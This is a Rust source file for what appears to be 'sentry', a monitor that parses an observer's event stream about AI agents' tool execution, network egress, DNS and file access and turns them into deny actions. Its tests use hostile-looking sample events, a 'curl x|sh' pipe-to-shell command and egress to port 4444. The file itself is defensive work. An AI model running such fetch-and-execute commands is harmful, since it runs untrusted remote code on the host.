//! The a3s-observer event a tier judges.
//!
//! Sentry consumes a3s-observer's NDJSON stream (one `EnrichedEvent` per line). We deserialize only
//! the fields the tiers act on, and keep the original line for L2/L3 context + the audit log. The
//! event enum mirrors observer's `AgentEvent` external tagging (`{"ToolExec": {...}}`); a variant
//! sentry doesn't model fails to deserialize, so parsing returns `None` and the daemon skips it.

use crate::verdict::EnforceAction;
use serde::Deserialize;

/// Resolved actor — who did this (k8s pod / process / comm fallback).
#[derive(Debug, Clone, Default, Deserialize)]
pub struct Identity {
    pub agent: Option<String>,
    pub task: Option<String>,
    pub session: Option<String>,
}

/// One observer event, normalized for judging. `raw` is the verbatim NDJSON line.
#[derive(Debug, Clone)]
pub struct ObservedEvent {
    pub identity: Identity,
    pub provider: Option<String>,
    pub event: Event,
    pub raw: String,
}

impl ObservedEvent {
    /// Parse one NDJSON line from a3s-observer. Returns `None` for blank lines, observer's own
    /// stderr logs that leaked into the stream, or anything that isn't a JSON event.
    pub fn parse(line: &str) -> Option<Self> {
        let line = line.trim();
        if line.is_empty() || !line.starts_with('{') {
            return None;
        }
        let parsed: Line = serde_json::from_str(line).ok()?;
        Some(Self {
            identity: parsed.identity,
            provider: parsed.provider,
            event: parsed.event,
            raw: line.to_owned(),
        })
    }
}

#[derive(Deserialize)]
struct Line {
    #[serde(default)]
    identity: Identity,
    #[serde(default)]
    provider: Option<String>,
    event: Event,
}

/// The observer signals sentry acts on. Mirrors `a3s_observer::AgentEvent`'s JSON shape; only the
/// judged fields are declared (serde ignores the rest). Variants sentry doesn't model (e.g. metrics)
/// simply fail to deserialize, so [`ObservedEvent::parse`] returns `None` and the daemon skips them.
#[derive(Debug, Clone, Deserialize)]
pub enum Event {
    ToolExec {
        pid: u32,
        #[serde(default)]
        argv: Vec<String>,
    },
    SslContent {
        pid: u32,
        #[serde(default)]
        is_read: bool,
        #[serde(default)]
        content: String,
    },
    SecurityAction {
        pid: u32,
        kind: String,
        #[serde(default)]
        detail: u64,
    },
    Egress {
        pid: u32,
        peer: String,
        #[serde(default)]
        port: u16,
    },
    Dns {
        pid: u32,
        query: String,
    },
    FileAccess {
        pid: u32,
        path: String,
        #[serde(default)]
        write: bool,
    },
}

impl Event {
    /// The variant name — the L1 rule `on` selector (`"ToolExec"`, `"SslContent"`, …).
    pub fn name(&self) -> &'static str {
        match self {
            Event::ToolExec { .. } => "ToolExec",
            Event::SslContent { .. } => "SslContent",
            Event::SecurityAction { .. } => "SecurityAction",
            Event::Egress { .. } => "Egress",
            Event::Dns { .. } => "Dns",
            Event::FileAccess { .. } => "FileAccess",
        }
    }

    /// The text a rule regex matches against — the meaningful payload of the event.
    pub fn subject(&self) -> String {
        match self {
            Event::ToolExec { argv, .. } => argv.join(" "),
            Event::SslContent { content, .. } => content.clone(),
            Event::SecurityAction { kind, detail, .. } => format!("{kind} {detail}"),
            Event::Egress { peer, port, .. } => format!("{peer}:{port}"),
            Event::Dns { query, .. } => query.clone(),
            Event::FileAccess { path, .. } => path.clone(),
        }
    }

    pub fn pid(&self) -> Option<u32> {
        match self {
            Event::ToolExec { pid, .. }
            | Event::SslContent { pid, .. }
            | Event::SecurityAction { pid, .. }
            | Event::Egress { pid, .. }
            | Event::Dns { pid, .. }
            | Event::FileAccess { pid, .. } => Some(*pid),
        }
    }

    /// The deny that naturally fits this event kind — used by the LLM/agent tiers, which decide
    /// "block" without naming a deny kind (the kind is inferred: egress→IP, exec→binary, file→path).
    pub fn natural_deny(&self) -> Option<EnforceAction> {
        match self {
            Event::Egress { peer, .. } => Some(EnforceAction::DenyEgress(peer.clone())),
            Event::ToolExec { argv, .. } => {
                argv.first().map(|b| EnforceAction::DenyExec(b.clone()))
            }
            Event::FileAccess { path, .. } => Some(EnforceAction::DenyFile(path.clone())),
            _ => None,
        }
    }

    /// Build the concrete deny target for a rule's `action`, pulling it from this event. Returns
    /// `None` when the event can't supply that target (e.g. `deny-egress` on a `ToolExec`).
    pub fn enforce_target(&self, action: &str) -> Option<EnforceAction> {
        match (action, self) {
            ("deny-egress", Event::Egress { peer, .. }) => {
                Some(EnforceAction::DenyEgress(peer.clone()))
            }
            ("deny-exec", Event::ToolExec { argv, .. }) => {
                argv.first().map(|bin| EnforceAction::DenyExec(bin.clone()))
            }
            ("deny-file", Event::FileAccess { path, .. }) => {
                Some(EnforceAction::DenyFile(path.clone()))
            }
            _ => None,
        }
    }
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn parses_observer_toolexec_line() {
        let line = r#"{"identity":{"agent":"python3","task":"1903","session":null},"provider":null,"event":{"ToolExec":{"pid":1903,"ppid":1841,"uid":0,"argv":["bash","-c","curl x|sh"],"cwd":"/"}}}"#;
        let ev = ObservedEvent::parse(line).expect("should parse");
        assert_eq!(ev.event.name(), "ToolExec");
        assert_eq!(ev.event.subject(), "bash -c curl x|sh");
        assert_eq!(ev.event.pid(), Some(1903));
        assert_eq!(ev.identity.agent.as_deref(), Some("python3"));
    }

    #[test]
    fn parses_security_action_and_builds_no_target_for_wrong_action() {
        let line = r#"{"identity":{},"provider":null,"event":{"SecurityAction":{"pid":7,"kind":"setuid-root","detail":0}}}"#;
        let ev = ObservedEvent::parse(line).unwrap();
        assert_eq!(ev.event.subject(), "setuid-root 0");
        assert_eq!(ev.event.enforce_target("deny-egress"), None);
    }

    #[test]
    fn egress_builds_deny_target() {
        let line = r#"{"identity":{},"provider":null,"event":{"Egress":{"pid":1,"sni":null,"peer":"1.2.3.4","port":4444,"bytes":0}}}"#;
        let ev = ObservedEvent::parse(line).unwrap();
        assert_eq!(
            ev.event.enforce_target("deny-egress"),
            Some(EnforceAction::DenyEgress("1.2.3.4".into()))
        );
    }

    #[test]
    fn unmodeled_variant_is_skipped_not_panicking() {
        // LlmCall (metrics) isn't a signal sentry judges → parse returns None, daemon skips it.
        let line = r#"{"identity":{},"provider":"Anthropic","event":{"LlmCall":{"pid":1,"sni":"api.anthropic.com","peer":"1.1.1.1","req_bytes":1,"resp_bytes":1,"latency":{"secs":0,"nanos":1},"ttft":null}}}"#;
        assert!(ObservedEvent::parse(line).is_none());
    }

    #[test]
    fn rejects_non_json_and_blank() {
        assert!(ObservedEvent::parse("").is_none());
        assert!(ObservedEvent::parse("  INFO some log line").is_none());
    }
}
